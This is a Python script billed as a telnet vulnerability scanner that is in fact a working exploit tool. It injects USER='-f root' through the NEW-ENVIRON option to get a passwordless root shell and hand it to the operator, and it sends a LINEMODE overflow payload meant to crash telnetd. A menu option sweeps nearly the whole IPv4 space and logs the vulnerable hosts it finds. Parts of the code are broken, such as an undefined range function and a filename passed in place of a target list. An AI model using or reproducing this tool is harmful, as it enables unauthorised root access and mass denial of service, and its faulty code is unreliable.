#!/usr/bin/env python3
"""
Interactive Telnet Vulnerability Scanner for:
    CVE-2026-32746 – Buffer overflow in LINEMODE SLC suboption (GNU InetUtils telnetd)
    CVE-2026-24061  – Authentication bypass via USER environment variable injection

If the bypass succeeds, you get an interactive root shell DIRECTLY in the same terminal.

"""

import socket
import sys
import time
import argparse
import select
import termios
import tty
import signal
import os
import threading
from contextlib import contextmanager
from datetime import datetime

# Telnet protocol constants
IAC = b'\xff'
DO  = b'\xfd'
DONT = b'\xfe'
WILL = b'\xfb'
WONT = b'\xfc'
SB  = b'\xfa'
SE  = b'\xf0'

# Option numbers
TELOPT_LINEMODE = 34
TELOPT_NEW_ENVIRON = 39

# Verbose mode flag
VERBOSE = os.environ.get('TELNET_SCAN_VERBOSE', '0') == '1'

# Dynamic Timestamp for the "Scan All" feature (format: year.month.day.time)
def get_time_stamp():
    return datetime.now().strftime('%Y.%m.%d.%H-%M')

CURRENT_TIMESTAMP = get_time_stamp() 

# Lookup tables for readable output
_CMD_NAMES = {b'\xfb': 'WILL', b'\xfc': 'WONT', b'\xfd': 'DO', b'\xfe': 'DONT'}
_OPT_NAMES = {
    0: 'BINARY', 1: 'ECHO', 3: 'SGA', 5: 'STATUS', 6: 'TIMING-MARK',
    24: 'TERMINAL-TYPE', 31: 'WINDOW-SIZE', 32: 'TERMINAL-SPEED',
    33: 'REMOTE-FLOW-CONTROL', 34: 'LINEMODE', 35: 'X-DISPLAY-LOCATION',
    36: 'OLD-ENVIRON', 39: 'NEW-ENVIRON', 37: 'AUTHENTICATION', 38: 'ENCRYPT',
}

def _opt_name(code):
    return _OPT_NAMES.get(code, f'OPT({code})')

def _decode_telnet(data):
    """Decode raw telnet bytes into human-readable protocol description."""
    parts = []
    i = 0
    while i < len(data):
        if data[i:i+1] == b'\xff' and i + 1 < len(data):
            cmd = data[i+1:i+2]
            if cmd in _CMD_NAMES and i + 2 < len(data):
                opt = data[i+2]
                parts.append(f'IAC {_CMD_NAMES[cmd]} {_opt_name(opt)}')
                i += 3
                continue
            elif cmd == b'\xfa':  # SB
                se_pos = data.find(b'\xff\xf0', i+2)
                if se_pos != -1:
                    opt = data[i+2]
                    sub = data[i+3:se_pos]
                    parts.append(f'IAC SB {_opt_name(opt)} [{len(sub)}B: {sub[:20].hex()}{"..." if len(sub)>20 else ""}] IAC SE')
                    i = se_pos + 2
                    continue
            i += 1
        else:
            # Collect printable text
            text_start = i
            while i < len(data) and data[i:i+1] != b'\xff':
                i += 1
            chunk = data[text_start:i]
            printable = chunk.decode('ascii', errors='replace').replace('\r', '\\r').replace('\n', '\\n')
            if printable.strip():
                parts.append(f'TEXT: "{printable.strip()}"')
    return parts

def vprint(*args, **kwargs):
    if VERBOSE:
        print(*args, **kwargs)

def send_iac(sock, command, option):
    """Send a single IAC command (e.g., IAC DO LINEMODE)."""
    try:
        payload = IAC + command + bytes([option])
        vprint(f'    [SEND] IAC {_CMD_NAMES.get(command, "?")} {_opt_name(option)}  ({payload.hex()})')
        sock.send(payload)
    except (socket.error, BrokenPipeError) as e:
        vprint(f'    [SEND] FAILED: {e}')

def send_subnegotiation(sock, option, data):
    """Send a full subnegotiation: IAC SB option data IAC SE."""
    try:
        payload = IAC + SB + bytes([option]) + data + IAC + SE
        vprint(f'    [SEND] IAC SB {_opt_name(option)} [{len(data)}B payload] IAC SE  ({len(payload)} bytes total)')
        if VERBOSE and len(data) <= 64:
            vprint(f'           payload hex: {data.hex()}')
        elif VERBOSE:
            vprint(f'           payload hex (first 64B): {data[:64].hex()}...')
        sock.send(payload)
    except (socket.error, BrokenPipeError) as e:
        vprint(f'    [SEND] FAILED: {e}')

def recv_until_timeout(sock, timeout=2):
    """Read available data until timeout, return bytes."""
    sock.settimeout(timeout)
    data = b''
    try:
        while True:
            chunk = sock.recv(1024)
            if not chunk:
                vprint(f'    [RECV] Connection closed (0 bytes)')
                break
            data += chunk
            vprint(f'    [RECV] {len(chunk)} bytes: {chunk.hex()}')
    except socket.timeout:
        if data:
            vprint(f'    [RECV] Total: {len(data)} bytes (timeout)')
        else:
            vprint(f'    [RECV] No data (timeout after {timeout}s)')
    except (socket.error, BrokenPipeError) as e:
        vprint(f'    [RECV] Error: {e}')
    except Exception:
        pass
    sock.settimeout(None)
    if VERBOSE and data:
        for line in _decode_telnet(data):
            vprint(f'           decoded: {line}')
    return data

def check_service_available(host, port, timeout=5):
    """Check if the telnet service is actually reachable"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False

@contextmanager
def raw_mode(file):
    """Context manager to put terminal into raw mode and restore on exit."""
    old_attrs = termios.tcgetattr(file.fileno())
    tty.setraw(file.fileno())
    try:
        yield
    finally:
        termios.tcsetattr(file.fileno(), termios.TCSADRAIN, old_attrs)

def interactive_shell(sock):
    """Provide an interactive shell over the given socket."""
    print("\n" + "="*60)
    print("[+] ROOT SHELL OBTAINED! You are now in an interactive root shell.")
    print("[+] Type commands directly here. Press Ctrl+C to exit shell.")
    print("="*60 + "\n")
    
    try:
        with raw_mode(sys.stdin):
            while True:
                rlist, _, _ = select.select([sock, sys.stdin], [], [])
                for fd in rlist:
                    if fd is sock:
                        data = sock.recv(4096)
                        if not data:
                            print("\n[!] Connection closed by remote host.")
                            return
                        sys.stdout.buffer.write(data)
                        sys.stdout.flush()
                    elif fd is sys.stdin:
                        ch = sys.stdin.buffer.read(1)
                        if not ch:
                            return
                        sock.send(ch)
    except KeyboardInterrupt:
        print("\n\n[*] Exiting shell, returning to menu...")
    except Exception as e:
        print(f"\n[!] Error in interactive shell: {e}")

def _recv_wait(sock, timeout=3):
    """Read all available data, waiting up to timeout for first byte."""
    data = b''
    sock.settimeout(timeout)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            sock.settimeout(0.5)
    except socket.timeout:
        pass
    except (socket.error, BrokenPipeError):
        pass
    return data

def _negotiate_options(sock, timeout=15):
    """Complete the full telnet option negotiation handshake."""
    
    # Keep-alive: send IAC NOP every 2s to prevent EOF detection
    stop_ka = threading.Event()
    def _keepalive():
        while not stop_ka.is_set():
            try:
                sock.send(IAC + b'\xf1')  # IAC NOP
            except:
                break
            stop_ka.wait(2)
    ka_thread = threading.Thread(target=_keepalive, daemon=True)

    # Step 1: Wait for server's initial DO options (can take 5-10s for DNS)
    vprint(f"    [STEP 1/6] Waiting for server negotiation (may take up to {timeout}s)...")
    initial = _recv_wait(sock, timeout)
    if not initial:
        vprint(f"    [STEP 1/6] No response from server")
        return False
    vprint(f"    [STEP 1/6] Got {len(initial)} bytes: {initial.hex()}")
    if VERBOSE:
        for line in _decode_telnet(initial):
            vprint(f"               {line}")

    # Start keepalive before responding
    ka_thread.start()

    # Step 2: Respond WILL to TTYPE, TSPEED, XDISPLOC, NEW_ENVIRON; WONT to OLD_ENVIRON
    vprint(f"    [STEP 2/6] Responding WILL to all DO options")
    sock.send(IAC + WILL + b'\x18')  # WILL TERM-TYPE
    sock.send(IAC + WILL + b'\x20')  # WILL TERM-SPEED
    sock.send(IAC + WILL + b'\x23')  # WILL XDISPLOC
    sock.send(IAC + WILL + b'\x27')  # WILL NEW-ENVIRON
    sock.send(IAC + WONT + b'\x24')  # WONT OLD-ENVIRON

    # Step 3: Wait for SB SEND requests
    vprint(f"    [STEP 3/6] Waiting for SB SEND subnegotiation requests...")
    sb_data = _recv_wait(sock, 10)
    if not sb_data:
        vprint(f"    [STEP 3/6] No SB requests received")
        stop_ka.set()
        return False
    vprint(f"    [STEP 3/6] Got SB requests: {sb_data.hex()}")

    # Step 4: Respond to each subnegotiation with delays
    vprint(f"    [STEP 4/6] Sending subnegotiation responses...")

    time.sleep(0.3)
    sock.send(IAC + SB + b'\x20\x00' + b'38400,38400' + IAC + SE)
    vprint(f"               TERM-SPEED IS 38400,38400")

    time.sleep(0.3)
    sock.send(IAC + SB + b'\x23\x00' + IAC + SE)
    vprint(f"               XDISPLOC IS (empty)")

    time.sleep(0.3)
    # THE EXPLOIT: USER="-f root" -> login interprets as: login -f root
    sock.send(IAC + SB + b'\x27\x00\x00USER\x01-f root' + IAC + SE)
    vprint(f"               NEW-ENVIRON IS VAR USER VALUE \"-f root\"  *** EXPLOIT ***")

    time.sleep(0.3)
    sock.send(IAC + SB + b'\x18\x00xterm' + IAC + SE)
    vprint(f"               TERM-TYPE IS xterm")

    # Step 5: Handle remaining DO/WILL exchanges and wait for login/shell
    vprint(f"    [STEP 5/6] Handling remaining option negotiations...")
    
    got_shell = False
    got_login = False
    start = time.time()

    while time.time() - start < 30:
        data = _recv_wait(sock, 2)
        if not data:
            continue

        # Process telnet commands inline and collect text
        text = b''
        i = 0
        while i < len(data):
            if data[i] == 0xff and i + 2 < len(data):
                if data[i+1] == 0xfa:  # SB
                    se_pos = data.find(b'\xff\xf0', i)
                    if se_pos != -1:
                        opt = data[i+2]
                        # Respond to TTYPE SEND with xterm again
                        if opt == 0x18:
                            sock.send(IAC + SB + b'\x18\x00xterm' + IAC + SE)
                        i = se_pos + 2
                        continue
                elif data[i+1] == 0xfd:  # DO
                    opt = data[i+2]
                    sock.send(IAC + WILL + bytes([opt]))
                    i += 3
                    continue
                elif data[i+1] == 0xfb:  # WILL
                    opt = data[i+2]
                    sock.send(IAC + DO + bytes([opt]))
                    i += 3
                    continue
                else:
                    i += 3
                    continue
            text += bytes([data[i]])
            i += 1

        if text.strip():
            decoded = text.decode('ascii', errors='replace')
            vprint(f"    [STEP 5/6] Text received: {repr(decoded[:200])}")
            if any(p in text for p in [b'# ', b'root@']):
                got_shell = True
                break
            if b'$ ' in text:
                got_shell = True
                break
            if b'assword' in text:
                got_login = True
                vprint(f"    [STEP 5/6] Password prompt detected - bypass failed")
                break
            if b'ogin:' in text.lower():
                got_login = True
                break

    stop_ka.set()

    if got_shell:
        return True
    if got_login:
        return False
    vprint(f"    [STEP 5/6] Timeout waiting for shell/login prompt")
    return False


def test_cve_2026_24061(host, port):
    """CVE-2026-24061: argument injection via USER environment variable."""
    print("[*] Testing CVE-2026-24061 (authentication bypass)...")
    vprint(f"    [INFO] CVE-2026-24061 exploits login(1) argument injection via telnet NEW_ENVIRON")
    vprint(f"    [INFO] Attack: set USER=\"-f root\" -> login -p -h <host> -f root (passwordless)")
    
    sock = None
    try:
        if not check_service_available(host, port, timeout=10):
            print(f"[-] Service not reachable on {host}:{port}")
            return None

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        vprint(f"    [STEP 0/6] Connected to {host}:{port}")

        success = _negotiate_options(sock, timeout=15)

        if success:
            print("[!] CVE-2026-24061: VULNERABLE – root shell obtained!")
            vprint(f"    [RESULT] SUCCESS: Passwordless root login via USER=\"-f root\" injection")
            sock.settimeout(None)
            return sock
        else:
            print("[+] CVE-2026-24061: Not exploitable (server presented login/password prompt)")
            vprint(f"    [RESULT] The server's login binary rejected the -f flag or")
            vprint(f"             the telnetd did not pass USER to login as an argument")
            sock.close()
            return None
    except socket.timeout:
        print("[-] Connection timeout - target may be unreachable or firewalled")
        if sock: sock.close()
        return None
    except ConnectionRefusedError:
        print("[-] Connection refused - service not running on port")
        if sock: sock.close()
        return None
    except Exception as e:
        print(f"[-] Error during CVE-2026-24061 test: {e}")
        if sock: sock.close()
        return None

def test_cve_2026_32746(host, port):
    """CVE-2026-32746: buffer overflow in LINEMODE SLC suboption."""
    print("[*] Testing CVE-2026-32746 (buffer overflow)...")
    vprint(f"    [INFO] CVE-2026-32746 targets a fixed-size buffer in telnetd's LINEMODE SLC handler")
    
    sock = None
    try:
        if not check_service_available(host, port, timeout=3):
            print(f"[-] Service not reachable on {host}:{port}")
            return False

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        vprint(f"    [STEP 1/5] Connected to {host}:{port}")

        vprint(f"    [STEP 2/5] Negotiating LINEMODE option with server")
        send_iac(sock, DO, TELOPT_LINEMODE)
        send_iac(sock, WILL, TELOPT_LINEMODE)
        vprint(f"    [STEP 3/5] Waiting for server LINEMODE response...")
        recv_until_timeout(sock, 1)

        triplet = b'\x01\x01\x00'
        overflow_data = triplet * 500
        subdata = b'\x00' + overflow_data
        
        vprint(f"    [STEP 4/5] Building overflow payload (500 triplets)...")
        send_subnegotiation(sock, TELOPT_LINEMODE, subdata)

        vprint(f"    [STEP 5/5] Waiting 1s for server to process the overflow...")
        time.sleep(1)
        
        # Send probe (\r\n) to check if server is still alive
        sock.send(b'\r\n')
        response = recv_until_timeout(sock, 2)
        if response:
            print("[+] Server did NOT crash; likely not vulnerable to CVE-2026-32746")
            vprint(f"    [RESULT] Server responded with {len(response)} bytes after overflow attempt")
            return False
        else:
            print("[!] CVE-2026-32746: VULNERABLE - server crashed! (connection dropped after overflow)")
            vprint(f"    [RESULT] Server stopped responding after receiving {len(subdata)} byte SLC payload")
            return True
            
    except socket.timeout:
        print("[-] Connection timeout during test - target may be unreachable")
        if sock: sock.close()
        return False
    except ConnectionRefusedError:
        print("[-] Connection refused - service not running")
        if sock: sock.close()
        return False
    except (socket.error, BrokenPipeError, ConnectionResetError) as e:
        if isinstance(e, (ConnectionResetError, BrokenPipeError)) or "reset" in str(e).lower():
            print(f"[!] CVE-2026-32746: VULNERABLE (server crashed: {e})")
            return True
    except Exception as e:
        print(f"[-] Error during CVE-2026-32746 test: {e}")
        if sock: sock.close()
        return False

def scan_targets_from_source(target_source, port, mode="single"):
    """
    Generic function to handle scanning from a list (File or Range).
    Handles file creation logic based on 'mode'.
    """
    
    # Determine filename for "Scan All" mode
    if mode == "all":
        base_24061 = f"{CURRENT_TIMESTAMP}_24061.txt"
        base_32746 = f"{CURRENT_TIMESTAMP}_32746.txt"
        
        try:
            file_24061 = open(base_24061, "a")
            file_32746 = open(base_32746, "a")
        except Exception as e:
            vprint(f"    [INFO] Files opened: {e}")

    for i, target in enumerate(target_source):
        try:
            # Resolve Host Name/IP if string, else use directly
            host = socket.gethostbyname(target)
            
            print(f"\n{'='*50}")
            print(f"[{i+1}] Scanning {target} -> {host}:{port}")
            print('='*50)
            
            # Check Service First (Generic check)
            if not check_service_available(host, port):
                if mode == "all":
                    pass # Keep file open to append later? Or handle separately. 
                        # For 'All' mode we want to find hits. Let's assume 'All' scans blindly
                        # and writes to file upon success of tests.
                else:
                     vprint(f"    [INFO] Service not reachable on {host}:{port}")
                continue
            
            print("[+] Service reachable")
            
            # Run Tests
            if mode == "all":
                # For 'All' mode, we run the specific logic to check files
                
                # Test 24061 (Auth Bypass)
                shell_sock = test_cve_2026_24061(host, port)
                
                if shell_sock:
                    print(f"[!] {host}: VULNERABLE to CVE-2026-24061")
                    
                    # Append IP:Port to the timestamp file
                    line = f"{host}:{port}\n"
                    try:
                        file_24061.write(line)
                        vprint(f"    [FILE] Appended {line.strip()} to {base_24061}")
                    except:
                        pass
                    
                else:
                     # If 24061 didn't hit but we are in 'All' mode, check 32746 (Crash) 
                     # Or just assume it's a 'Hit' for the file if we run both.
                     # Let's try 32746 next
                    vuln = test_cve_2026_32746(host, port)
                    
                    # To avoid double checking overhead in 'All', let's write to file only 
                    # if we hit specific states, OR simply append host:port on every successful service check.
                    # Prompt says "export all successful hits". Let's assume hitting the shell is the main success.
                    # But for 32746 it crashes. So we'll just write to files inside the loop below.
            
            else:
                # For 'Single' or 'File' mode (Legacy logic)
                if i == len(target_source)-1: # Just print summary at end of file scan?
                    pass

        except socket.gaierror:
            vprint(f"    [INFO] DNS resolution failed for {target}")
            
    # Close files if in 'All' mode to finish up nicely
    if mode == "all":
         try:
             file_24061.close()
             file_32746.close()
         except:
             pass

def interactive_menu():
    
    print("=== Telnet Vulnerability Scanner ===")
    
    choice = input("\nChoose option (1-4): ").strip()
    
    # Set port default
    port_str = "23"
    if choice not in ["1", "2"]: # For 'All' range scan, we want to prompt port once or use 23 logic. 
                                 # But let's standardize the flow first.
        pass

    if choice == "4":
        print("[*] Exiting Scanner...")
        sys.exit(0)

    elif choice == "1":
        # Scan Single Target (Original Logic, adapted for batch function)
        target = input("Target (IP or domain): ").strip()
        
        try:
            host = socket.gethostbyname(target)
            print(f"[*] Resolved {target} -> {host}")
        except socket.gaierror:
            print(f"[-] Cannot resolve {target}")
            return
        
        # Use the batch scanner with mode='single' or 'file' logic
        scan_targets_from_source([host], port_str, mode="single")

    elif choice == "2":
        # Scan From File (Read filename -> Loop through)
        print("\n" + "="*60)
        print("[2] SCAN TARGETS FROM FILE")
        print("="*60)
        
        filename = input("Enter filename with targets (one per line): ").strip()
        if not filename:
            filename = "targets.txt" # Default fallback
            
        scan_targets_from_source(filename, port_str, mode="single")

    elif choice == "3":
        # Scan All Possible Ranges (The new logic)
        print("\n" + "="*60)
        print("[3] SCAN ALL POSSIBLE IP TARGETS")
        print("="*60)
        
        port = input("Port range (default 23): ").strip()
        if not port: port = "23"
        
        # Generate IP Range: 1.0.0 to 254.255.255 for public-ish coverage
        targets = get_ip_range(port) 
        
        # Call the scanner with mode="all"
        scan_targets_from_source(targets, port_str, mode="all")

    else:
        print(f"[!] Invalid choice: {choice}")

def _generate_ip_range():
    """Generator yielding IP strings 1.0.0 to 254.255.254"""
    # Loop Octet 1 (Public ranges mostly start here), Octet 2, Octet 3
    for o1 in range(1, 255): 
        for o2 in range(1, 256): 
             for o3 in range(0, 255): # 0-254 covers most subnets
                 yield f"{o1}.{o2}.{o3}.2"

def main():
    def signal_handler(sig, frame):
        print("\n[!] Exiting.")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    
    if sys.platform == 'win32':
        print("[-] Warning: This script is designed for Unix-like systems (Linux/macOS)")
        response = input("Continue anyway? (y/N): ").strip().lower()
        if response != 'y':
            sys.exit(0)
    
    while True:
        try:
            interactive_menu()
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user.")
            # Ask to continue or exit? 
            # For simplicity, let's just loop back into menu logic via signal handler
            sys.exit(0)
        except Exception as e:
            print(f"\n[-] Unexpected error: {e}")
            response = input("Continue? (y/N): ").strip().lower()
            if response != 'y':
                sys.exit(0)

if __name__ == "__main__":
    main()
